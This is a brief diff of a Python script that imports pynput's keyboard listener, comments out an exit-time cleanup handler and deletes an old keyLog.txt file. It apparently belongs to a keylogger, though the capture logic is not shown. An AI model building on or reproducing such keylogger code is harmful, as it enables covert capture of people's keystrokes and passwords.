@@ -1,13 +1,13 @@
 from pynput.keyboard import Key, Listener
 import logging
 import os
-from Formatting import Cleanup
+#from Formatting import Cleanup
 import atexit
 
-def exit_handler():
-    Cleanup.format_output()
+#def exit_handler():
+#    Cleanup.format_output()
 
-atexit.register(exit_handler)
+#atexit.register(exit_handler)
 
 if os.path.exists("keyLog.txt"):
   os.remove("keyLog.txt")
